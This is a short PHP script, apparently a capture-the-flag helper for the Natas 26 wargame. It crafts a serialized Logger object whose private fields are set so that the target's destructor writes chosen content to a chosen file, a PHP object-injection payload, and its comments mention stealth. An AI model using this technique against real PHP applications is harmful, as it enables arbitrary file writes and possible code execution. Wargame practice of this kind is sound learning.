<?php

// 1) see what serialized Logger looks like

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __destruct() {
        if ($this->exitMsg)
            print("adding " . $this->exitMsg . " to " . $this->logFile . "\n");
    }
}

$array = array("0" => new Logger()); // array because '$drawing[]=$new_object;' line 105 will fail otherwise (not necessary here, but no error is stealthier so better)

print(serialize($array) . "\n"); // -> "a:1:{i:0;O:6:\"Logger\":3:{s:15:\"\0Logger\0logFile\";N;s:15:\"\0Logger\0initMsg\";N;s:15:\"\0Logger\0exitMsg\";N;}}"

// 2) adapt it

$target_file = "plop.txt";
$content = "LULZ";

$pwn_serialized = "a:1:{i:0;O:6:\"Logger\":3:{s:15:\"\0Logger\0logFile\";s:" . strlen($target_file) . ":\"" . $target_file . "\";s:15:\"\0Logger\0initMsg\";N;s:15:\"\0Logger\0exitMsg\";s:" . strlen($content) . ":\"" . $content . "\";}}";

unserialize($pwn_serialized); // to check unserialization works

# see natas26.py for the exploit

?>